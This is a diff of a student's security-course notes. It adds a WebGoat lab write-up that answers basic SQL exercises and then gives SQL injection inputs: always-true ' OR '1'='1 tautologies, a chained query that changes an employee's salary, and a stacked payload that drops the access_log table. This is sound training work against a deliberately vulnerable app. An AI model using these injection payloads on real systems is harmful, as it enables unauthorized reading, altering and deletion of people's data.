@@ -108,6 +108,7 @@ In this history, the biggest mistake from Evaldas was to register the fake domai
 # CVE - Explanation
 ## [Log4j - CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228)
 When an application is developed, we usually add some logs. The logs are used to track what is made in the application. Logs are really useful to find who did what and when, so, we can easily find when an error as occurred and why. Apache Software Fundation provide a dependency for Java, to help developers for logging.
+
 On 9 December 2021, an important flaw has been discovered for Log4j 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1).
 LDAP is a standard way to provide access to directory information. In java, to access directory services such as LDAP, we use the interface JNDI.
 Indeed, JNDI is an interface that gives to Java an access to directory services such as LDAP. 
@@ -174,3 +175,72 @@ Another huge problem with this attack is the number of companies that are involv
 ----
 <a name="webgoat"></a>
 # WebGoat - Solve
+*I did not need to install the WebGoat Spring server on my Debian, because it was already installed, due to the exercises of the last week [H1_FirstSteps](https://github.com/MatthieuBruh/h1_FirstSteps)*
+
+*I only started the server with the command*:
+
+    java -jar webgoat-server-8.0.0.M26.jar
+
+*When the server has started, I used Google Chrome to go on: localhost:8080/WebGoat .*
+
+## 2. What is SQL?
+
+    SELECT department FROM employees WHERE first_name = 'Bob' AND last_name = 'Franco';
+    # As selected attribute, I choose only department, because we only need the department.
+    # To select only the employee Bob Franco, I added the where condition on the first name and the last name.
+
+## 3. Data Manipulation Language (DML)
+
+    UPDATE employees SET department = 'Sales' WHERE first_name = 'Tobi' AND last_name = 'Barnett';
+    # I choose the SQL statement UPDATE to modify the table employees.
+    # I added the argument SET department to determine which attribute will be updated.
+    # To modify the department of the right employee, I added the where condition on first name and last name.
+
+## 4. Data Definition Langugage (DDL)
+
+    ALTER TABLE employees ADD phone varchar(20);
+    # I choose the SQL statement ALTER TABLE to modify the scheme of the table employees.
+    # Then I said that I want to ADD a column named phone and the type is a varchar of a maximal length of 20.
+
+## 5. Data Control Language (DCL)
+
+    GRANT ALTER TABLE TO UnauthorizedUser;
+    # I choose the SQL statement GRANT ALTER TABLE TO, that allow me to change the authorization of the table.
+
+## 9. Try it! String SQL injection
+
+    SELECT * FROM user_data WHERE first_name = 'John' and last_name = '' or '1' = '1'
+    # The second term of the where condition of the SQL query, allow me to always have the condition as true.
+    # Indeed, one is always equal to one.
+
+## 10. Try it! Numeric SQL injection
+
+    SELECT * FROM user_data WHERE login_count = " + Login_Count + " AND userid = "  + User_ID;
+    login_Count: 1
+    User_id: 1 or TRUE;
+    # The login_count field does not matter. We can choose a random number.
+    # However, the user_id need to be always correct, so we create the condition that will always be true by adding "or and TRUE".
+
+## 11. Compromising confidentiality with String SQL injection
+
+    SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "';
+    Employee Name:' OR '1'='1
+    Authentication TAN:' OR '1'='1
+    # By using ' as the first element of the each entry, you say that the field must be empty OR '1'='1'.
+    # The result would be: SELECT * FROM employees WHERE last_name = '' OR '1'='1' AND auth_tan = '' OR '1'='1';
+
+## 12. Compromising Integrity with Query chaining
+
+    Employee Name: matthieu'; UPDATE employees SET salary = '85000' WHERE userid = '37648'--
+    Authentication TAN:
+    # I left the authentication TAN empty because we only need to write in one field.
+    # The value matthieu can be what you want. However, it should finish the query by using ';
+    # Then you can create your personalized query by adding the double - at the end of your query.
+
+## 13. Compromising Availability
+
+    Action contains: ';DROP TABLE access_log;--
+    # I added a new query at the end of the first one to drop (delete) the table access_log
+
+
+
